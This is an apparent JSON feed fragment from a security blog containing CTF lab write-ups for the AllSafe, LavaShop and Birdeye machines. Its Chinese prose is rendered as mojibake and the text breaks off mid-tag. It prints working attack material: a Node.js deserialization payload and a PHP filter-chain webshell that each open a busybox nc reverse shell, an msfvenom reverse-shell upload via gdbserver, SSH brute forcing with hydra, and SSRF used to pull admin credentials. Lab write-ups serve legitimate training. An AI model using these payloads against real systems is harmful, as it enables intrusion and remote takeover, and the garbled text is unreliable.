å¦‚æœæ‚¨æƒ³è”ç³»æˆ‘ä»¬ï¼Œè¯·ä¸è¦ä½¿ç”¨å¸¸è§„æ¸ é“ã€‚\nä»ç°åœ¨å¼€å§‹ï¼Œæ‰€æœ‰è”ç³»éƒ½å°†ä»…é€šè¿‡å®‰å…¨æ¸ é“è¿›è¡Œã€‚\n> \n> \n> è¿æ¥åˆ°æ¶ˆæ¯æœåŠ¡å™¨å¹¶è¿›å…¥æˆ¿é—´ï¼š\n> dark-ops\n> \n> è¯·å‹¿å°è¯•å°†æ­¤è®¿é—®æƒé™ç”¨äºä»»ä½•æœªç»çº¦å®šçš„ç”¨é€”ã€‚\n> æˆ‘ä»¬å†³å®šå¯¹è¯çš„æ—¶é—´å’Œæ–¹å¼ã€‚\n> \n\næŸ¥çœ‹æ­£åœ¨ç›‘å¬ç«¯å£ï¼Œæœ‰ä¸¤ä¸ªå¼€åœ¨æœ¬åœ°çš„\n\n```python\ncisco@allsafe:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process                  \nudp                    UNCONN                  0                       0                                              0.0.0.0:68                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                         127.0.0.1:40089                                          0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                           0.0.0.0:80                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                           0.0.0.0:2222                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       511                                          127.0.0.1:3000                                           0.0.0.0:*                                              \ntcp                    LISTEN                  0                       4096                                              [::]:80                                                [::]:*                                              \ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*                                              \ntcp                    LISTEN                  0                       4096                                              [::]:2222                                              [::]:* \n```\n\n### Node.js ååºåˆ—åŒ–\n\n3000 ç«¯å£è¿˜æ˜¯ä¸€ä¸ª `web` ï¼Œç™»å½•æ¡†\n\n![image.png](/post-images/TheHackersLabsAllSafe/image21.png)\n\nå°† `3000` ç«¯å£è½¬å‘å‡ºæ¥\n\n```python\n./socat TCP-LISTEN:3001,fork TCP4:127.0.0.1:3000 &\n```\n\næ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œéœ€è¦ä¸‰ä¸ªå‚æ•°\n\n![image.png](/post-images/TheHackersLabsAllSafe/image22.png)\n\nåˆ†åˆ«è¾“å…¥ `cisco` `dark-ops` `drk2025!` æç¤ºè®¤è¯é”™è¯¯\n\n![image.png](/post-images/TheHackersLabsAllSafe/image23.png)\n\nåœ¨ `/vat/log` ä¸­å‘ç° `app.log` ï¼Œä¸å¸¸è§\n\n![image.png](/post-images/TheHackersLabsAllSafe/image24.png)\n\nåœ¨é‡Œè¾¹èƒ½å¾—åˆ°ä¸¤ä¸ªå‡­æ®\n\n![image.png](/post-images/TheHackersLabsAllSafe/image25.png)\n\n```python\nDLFJYxLLSzp1x5Ttpsffpg2awuJT5K\n```\n\nå°†å¯†ç æ¢æˆ `DLFJYxLLSzp1x5Ttpsffpg2awuJT5K` æˆåŠŸè¿æ¥ï¼ŒèŠå¤©è¿˜æ˜¯ç”¨ä¸­æ–‡ï¼ˆ\n\nè¿™é‡Œå°è¯•ä¸€ä¸‹ SQL æ³¨å…¥ï¼ŒSSTI ä¹‹ç±»çš„ï¼Œä¹Ÿæ²¡èƒ½æ‰¾åˆ°ä»€ä¹ˆ\n\n![image.png](/post-images/TheHackersLabsAllSafe/image26.png)\n\néœ€è¦çŸ¥é“ 3000 ç«¯å£è¿è¡Œåœ¨ä»€ä¹ˆç¨‹åºä¸Šï¼ŒæŸ¥çœ‹ä¸€ä¸‹æŠ“çš„åŒ…\n\n![image.png](/post-images/TheHackersLabsAllSafe/image27.png)\n\nå› ä¸º `Socket.IO` æ˜¯ Node.js çš„æµè¡Œå®æ—¶åº“ï¼Œæ‰€ä»¥çŒœæµ‹å®ƒæ˜¯ `Node.js`\n\n![image.png](/post-images/TheHackersLabsAllSafe/image28.png)\n\nåœ¨æŸ¥çœ‹è¿›ç¨‹æ—¶ä¹Ÿèƒ½çœ‹åˆ° root è¿è¡Œäº† nodejs\n\n```python\nroot         308  0.0  1.6 1248480 67224 ?       Ssl  06:28   0:01 node server.js \n```\n\nè¿˜å‘ç°äº†è¿™ä¸ª `Cookie` æ˜¯ä»…ä»…é€šè¿‡ Base64 åŠ å¯†äº†è€Œå·²ï¼Œæ¨¡æ‹Ÿäº†å…¶ä»–ç”¨æˆ·åä¹Ÿæ²¡ä»€ä¹ˆåµç”¨\n\n![image.png](/post-images/TheHackersLabsAllSafe/image29.png)\n\nçœ‹äº†ä¸€ä¸‹è€å¤œå’Œå›½å¤–è€å‹çš„WPï¼ˆhttps://7r1umphk.github.io/post/thl_allsafe.htmlï¼‰ï¼ˆhttps://github.com/nohh022/writeups/blob/main/TheHackerLabs/AllSafe/AllSafe.mdï¼‰æ‰çŸ¥é“è¿™é‡Œæœ‰ååºåˆ—åŒ–æ¼æ´\n\nä¸€äº›æ–‡ç« ï¼šhttps://cloud.tencent.com/developer/article/1374840\n\npayloadï¼š\n\n```python\n{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('busybox nc 192.168.56.5 1234 -e /bin/bash', function(error,stdout,stderr){})}()\"}\n```\n\nè¿›è¡Œ `base64` ç¼–ç ï¼Œæ›¿æ¢ä¸Šå»\n\n![image.png](/post-images/TheHackersLabsAllSafe/image30.png)\n\næ¥åˆ°æ§åˆ¶å°ï¼Œè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼Œå…ˆæ–­å¼€å¥—æ¥å­—å¹¶é‡æ–°è¿æ¥ï¼ŒæœåŠ¡å™¨å°±ä¼šé‡æ–°ååºåˆ—åŒ–\n\n```python\nsocket.close()\nsocket.connect()\n```\n\nè¯»å– `root.txt` å³å¯\n\n![image.png](/post-images/TheHackersLabsAllSafe/image31.png)\n\n## æ€»ç»“\n\nè¦è€å¿ƒ è€å¿ƒ è€å¿ƒ è€å¿ƒ",
            "url": "https://www.sunsetaction.top/2025/10/21/TheHackersLabsAllSafe",
            "title": "TheHackersLabs - AllSafe",
            "summary": "AllSafe https://labs.thehackerslabs.com/machine/139 Recon PortScan æšä¸¾ 80 ç«¯å£ï¼ŒåŸŸåæ˜¯ allsafe.thl ç›®å½•æ‰«æï¼Œæ‰«å‡ºæ¥çš„ä¸œè¥¿å¤ªå¤šå°±ä¸æ”¾å‡ºæ¥äº†ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥çœ‹çš„ ä¸»ç«™ä¸­è¿˜æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥æäº¤ç½‘å€ï¼Œæ‰€ä»¥ç´¢æ€§æµ‹è¯•äº† SSRF...",
            "date_modified": "2025-10-21T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackerLabs",
                "Linux",
                "LFI",
                "FUZZ",
                "PasswordSafe",
                "Make",
                "Nodejsååºåˆ—åŒ–"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop",
            "content_html": "\n# LavaShop\n\n> https://labs.thehackerslabs.com/machine/140\n> \n\n![image.png](/post-images/TheHackersLabsLavaShop/image.png)\n\n## Recon\n\n### PortScan\n\n```python\nâœ  LavaShop nmap -sT -min-rate 10000 -p- 192.168.56.129\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:34 CST\nNmap scan report for 192.168.56.129\nHost is up (0.00051s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n1337/tcp open  waste\nMAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.68 seconds\n```\n\n```python\nâœ  LavaShop nmap -sT -A -p 22,80,1337 192.168.56.129   \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-20 21:35 CST\nNmap scan report for 192.168.56.129\nHost is up (0.00046s latency).\n\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)\n| ssh-hostkey: \n|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)\n|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)\n80/tcp   open  http       Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://lavashop.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n1337/tcp open  tcpwrapped\nMAC Address: 08:00:27:18:2F:9D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.129\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 15.38 seconds\n```\n\n### æšä¸¾\n\n`80` ç«¯å£\n\n![image.png](/post-images/TheHackersLabsLavaShop/image1.png)\n\n1337 ç«¯å£\n\n```python\nâœ  LavaShop echo \"1234\" | nc 192.168.56.129 1337\n(UNKNOWN) [192.168.56.129] 1337 (?) : Connection refused\n```\n\nç›®å½•æ‰«æ\n\n```python\nâœ  LavaShop feroxbuster --url http://lavashop.thl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,503,400 -x php,txt\n                                                                                                                  \n ___  ___  __   __     __      __         __   ___                                                                \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                 \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                \nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0                                                                \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                                \n ğŸ¯  Target Url            â”‚ http://lavashop.thl                                                                  \n ğŸš€  Threads               â”‚ 50                                             \n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [php, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\n ğŸ‰  New Version Available â”‚ https://github.com/epi052/feroxbuster/releases/latest\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      191l      466w     4025c http://lavashop.thl/assets/css/styles.css\n200      GET       45l      105w     1539c http://lavashop.thl/index.php\n301      GET        9l       28w      312c http://lavashop.thl/pages => http://lavashop.thl/pages/\n301      GET        9l       28w      313c http://lavashop.thl/assets => http://lavashop.thl/assets/\n301      GET        9l       28w      315c http://lavashop.thl/includes => http://lavashop.thl/includes/\n200      GET       45l      105w     1539c http://lavashop.thl/\n301      GET        9l       28w      320c http://lavashop.thl/assets/images => http://lavashop.thl/assets/images/\n301      GET        9l       28w      317c http://lavashop.thl/assets/css => http://lavashop.thl/assets/css/\n301      GET        9l       28w      321c http://lavashop.thl/includes/pages => http://lavashop.thl/includes/pages/\n200      GET       19l       40w      698c http://lavashop.thl/includes/header.php\n200      GET        8l       20w      424c http://lavashop.thl/includes/nav.php\n200      GET        5l       27w      208c http://lavashop.thl/pages/about.php\n200      GET       26l       97w     1017c http://lavashop.thl/pages/products.php\n200      GET        8l       23w      246c http://lavashop.thl/includes/pages/contact.php\n200      GET        4l        7w      139c http://lavashop.thl/pages/contact.php\n200      GET        5l       20w      195c http://lavashop.thl/pages/home.php\n200      GET        5l       14w      105c http://lavashop.thl/includes/footer.php\n200      GET        6l       26w      192c http://lavashop.thl/includes/pages/catalog.php\n200      GET        4l       30w      208c http://lavashop.thl/includes/pages/home.php\n```\n\nçœ‹ç€åƒæ˜¯å­˜åœ¨ LFI ï¼Œæšä¸¾ä¸€ä¸‹ `index.php` çš„ page å‚æ•°\n\n```python\nâœ  LavaShop ffuf -u 'http://lavashop.thl/index.php?page=FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/index.php?page=FUZZ\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\nabout                   [Status: 200, Size: 1268, Words: 140, Lines: 41, Duration: 0ms]\ncontact                 [Status: 200, Size: 1199, Words: 115, Lines: 40, Duration: 0ms]\nhome                    [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 0ms]\nproducts                [Status: 200, Size: 2077, Words: 296, Lines: 62, Duration: 0ms]\n                        [Status: 200, Size: 1539, Words: 192, Lines: 45, Duration: 4ms]\n:: Progress: [74332/74332] :: Job [1/1] :: 8333 req/sec :: Duration: [0:00:08] :: Errors: 0 ::\n```\n\næ²¡æœ‰æšä¸¾å‡ºæ¥ï¼Œå†æšä¸¾ä¸€ä¸‹å…¶ä»–é¡µé¢æ˜¯å¦å­˜åœ¨å‚æ•°\n\næœ‰ç‚¹é˜´äº†ï¼Œè—åœ¨ `products.php`\n\n```python\nâœ  LavaShop ffuf -u 'http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fs 1017\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://lavashop.thl/pages/products.php?FUZZ=/etc/passwd\n :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 1017\n________________________________________________\n\nfile                    [Status: 200, Size: 2481, Words: 225, Lines: 55, Duration: 1ms]\n```\n\næˆåŠŸåŒ…å«\n\n```python\nâœ  LavaShop curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'                \n  <section style=\"margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;\">\n    <p style=\"margin:0 0 .75rem;\">Incluyendo: <code>/etc/passwd</code></p>\n    <pre style=\"white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;\">\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                   \nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync                                                                                \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                   \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\nmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\nsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\ndebian:x:1000:1000:debian,,,:/home/debian:/bin/bash\nRodri:x:1001:1001::/home/Rodri:/bin/bash\n```\n\n## LFI\n\nå°†ç”¨æˆ· Rodri æ‹¿å»åå°çˆ†ç ´\n\n```python\nLavaShop hydra -l Rodri -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.129 ssh\n```\n\nç»§ç»­æµ‹è¯• LFIï¼Œå¯ä»¥ä½¿ç”¨ä¼ªåè®®\n\n![image.png](/post-images/TheHackersLabsLavaShop/image2.png)\n\nèƒ½ç›´æ¥è¯» user.txt\n\n![image.png](/post-images/TheHackersLabsLavaShop/image3.png)\n\nç»§ç»­æµ‹è¯•ï¼Œå°è¯•ä½¿ç”¨ https://github.com/synacktiv/php_filter_chain_generator\n\n```python\npython lfi.py --chain '<?php phpinfo();?>'\n```\n\næˆåŠŸæ‰§è¡Œ\n\n![image.png](/post-images/TheHackersLabsLavaShop/image4.png)\n\nåå¼¹ `shell`\n\n```python\npython lfi.py --chain '<?php eval(system($_GET[\"x\"])); ?>  '  \n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image5.png)\n\n```python\nx=busybox nc 192.168.56.5 1234 -e /bin/bash\n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image6.png)\n\n## ææƒ - Rodri\n\næŸ¥çœ‹è¿›ç¨‹å¯ä»¥çœ‹åˆ°åå°æœ‰ä¸ª `gdbserver`\n\n![image.png](/post-images/TheHackersLabsLavaShop/image7.png)\n\nç½‘ä¸Šæ”¶é›†äº†å‡ ä¸ª payload è¿™ä¸ªèƒ½ç”¨ï¼š\n\n[æ¸—é€æµ‹è¯•è¿œç¨‹ GdbServer - HackTricks --- Pentesting Remote GdbServer - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver)\n\n```python\n# Trick shared by @B1n4rySh4d0w\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf\n\nchmod +x binary.elf\n\ngdb binary.elf\n\n# Set remote debuger target\ntarget extended-remote 192.168.56.129:1337\n\n# Upload elf file\nremote put binary.elf binary.elf\n\n# Set remote executable file\nset remote exec-file /home/Rodri/binary.elf\n\n# Execute reverse shell executable\nrun\n\n# You should get your reverse-shell\n```\n\n![image.png](/post-images/TheHackersLabsLavaShop/image8.png)\n\n## ææƒ\n\n`root` å¯†ç è—åœ¨ç¯å¢ƒå˜é‡é‡Œé¢\n\n![image.png](/post-images/TheHackersLabsLavaShop/image9.png)",
            "url": "https://www.sunsetaction.top/2025/10/20/TheHackersLabsLavaShop",
            "title": "TheHackersLabs - LavaShop",
            "summary": "LavaShop https://labs.thehackerslabs.com/machine/140 Recon PortScan æšä¸¾ 80 ç«¯å£ 1337 ç«¯å£ ç›®å½•æ‰«æ çœ‹ç€åƒæ˜¯å­˜åœ¨ LFI ï¼Œæšä¸¾ä¸€ä¸‹ index.php çš„ page å‚æ•° æ²¡æœ‰æšä¸¾å‡ºæ¥ï¼Œå†æšä¸¾ä¸€ä¸‹å…¶ä»–é¡µé¢æ˜¯å¦å­˜åœ¨å‚æ•° ...",
            "date_modified": "2025-10-20T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackerLabs",
                "Linux",
                "LFI",
                "Fuzz",
                "Gdbserver"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/10/17/HackMyVMBirdeye",
            "content_html": "\n# Birdeye.\n\n> https://hackmyvm.eu/machines/machine.php?vm=Birdeye\n> \n\n![image.png](/post-images/HackMyVMBirdeye/image.png)\n\n## Recon\n\n### PortScan\n\n```python\nâœ  Birdeye nmap -sT -min-rate 10000 -p- 192.168.56.127\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 19:45 CST\nNmap scan report for 192.168.56.127\nHost is up (0.00027s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n53/tcp   open  domain\n80/tcp   open  http\n5000/tcp open  upnp\nMAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 17.44 seconds\n```\n\n```python\nâœ  Birdeye nmap -sT -A -p 53,80,5000 192.168.56.127                    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-10-17 20:02 CST\nNmap scan report for 192.168.56.127\nHost is up (0.00046s latency).\n\nPORT     STATE SERVICE VERSION\n53/tcp   open  domain  ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.18-Ubuntu\n80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: client\n|_http-cors: GET POST OPTIONS\n5000/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.6.9)\n|_http-title: 404 Not Found\n|_http-server-header: Werkzeug/2.0.3 Python/3.6.9\nMAC Address: 08:00:27:C2:DE:A0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.127\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 29.38 seconds\n```\n\n### æšä¸¾\n\n80 ç«¯å£çš„æœç´¢æ—¶å‘çš„åŒ…å¾ˆå¥‡æ€ª\n\n![image.png](/post-images/HackMyVMBirdeye/image1.png)\n\nçœ‹ç€å­˜åœ¨ `SSRF`\n\n![image.png](/post-images/HackMyVMBirdeye/image2.png)\n\næ”¹æˆ kali çš„ IP è¯•è¯•\n\n![image.png](/post-images/HackMyVMBirdeye/image3.png)\n\nå­˜åœ¨ `SSRF`\n\n![image.png](/post-images/HackMyVMBirdeye/image4.png)\n\nå¹¶ä¸”åŸæœ¬åé¢çš„ URL æ˜¯ï¼š`http://localhost:5000/api/products/?search=\"\"`\n\n## SSRF\n\nåˆ©ç”¨ SSRF æ¼æ´è¿›è¡Œæšä¸¾\n\né¦–å…ˆæšä¸¾å†…ç½‘ç«¯å£\n\n```python\nâœ  Birdeye ffuf -u 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/' -w port -fc 500\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://192.168.56.127/api/fetch-url?url=http://127.0.0.1:FUZZ/\n :: Wordlist         : FUZZ: /root/Desktop/HackMyVM/Birdeye/port\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response status: 500\n________________________________________________\n\n80                      [Status: 200, Size: 288, Words: 38, Lines: 8, Duration: 106ms]\n:: Progress: [10000/10000] :: Job [1/1] :: 357 req/sec :: Duration: [0:00:29] :: Errors: 0 ::\n```\n\næˆ‘ä»¬å†æ ¹æ®åŸæœ¬`403` çš„åœ°å€è¿›è¡Œè®¿é—®ï¼Œä¾‹å¦‚ï¼š\n\n```python\n403      GET        1l        5w       32c http://192.168.56.127/admin/config\n401      GET        1l        1w       25c http://192.168.56.127/admin/dashboard\n```\n\næˆåŠŸåŒ…å«åˆ°è´¦æˆ·å¯†ç ï¼Œå¹¶ä¸”å‘Šè¯‰æˆ‘ä»¬ `/api/fetch-url` æ”¯æŒ `GET, POST, OPTIONS` ä¸‰ç§æ–¹æ³•\n\n```python\nâœ  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://127.0.0.1/admin/config'\nHTTP/1.1 200 OK\nDate: Fri, 17 Oct 2025 13:32:01 GMT\nServer: Werkzeug/2.0.3 Python/3.6.9\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nContent-Type: application/json\nContent-Length: 106\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\n\n{\"admin_password\":\"SuperSecret123!\",\"admin_user\":\"superadmin\",\"login_panel_path\":\"/admin/panelloginpage\"}\n```\n\næ ¹æ®è·å–åˆ°å†…å®¹è®¿é—®åè®¿é—®åå°åœ°å€\n\n![image.png](/post-images/HackMyVMBirdeye/image5.png)\n\næˆ‘ä»¬æœ‰å¿…è¦å‘é€ POST æ•°æ®ï¼ˆè¿™é‡Œçœ‹äº†ä¸‹ WPï¼Œæ²¡æƒ³åˆ°æ˜¯è¿™æ ·æ›´æ¢æ–¹æ³•ï¼‰ï¼Œæ‰€ä»¥æ¥ä¸Š `curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST'`\n\n```python\nâœ  Birdeye curl -i 'http://192.168.56.127/api/fetch-url?url=http://localhost/admin/panelloginpage&method=POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'admin_user=superadmin&admin_password=SuperSecret123!'\nHTTP/1.1 200 OK\nDate: Fri, 17 Oct 2025 13:35:48 GMT\nServer: Werkzeug/2.0.3 Python/3.6.9\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nContent-Type: text/html; charset=utf-8\nContent-Length: 145\nAccess-Control-Allow-Origin: *, *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Headers: Content-Type\nVary: Cookie,Accept-Encoding\nSet-Cookie: session=eyJhZG1pbl9hdXRoZW50aWNhdGVkIjp0cnVlfQ.aPJGNA.-3-eVxjfstKta_I4ubREsK2pnAg; Domain=192.168.1.237; Path=/\n\n    <h2>Admin Dashboard</h2>\n    <form method=\"post\">\n        <label>Command: <input name=\"command\" type=\"text\"></label>\n        <button type=\"s#   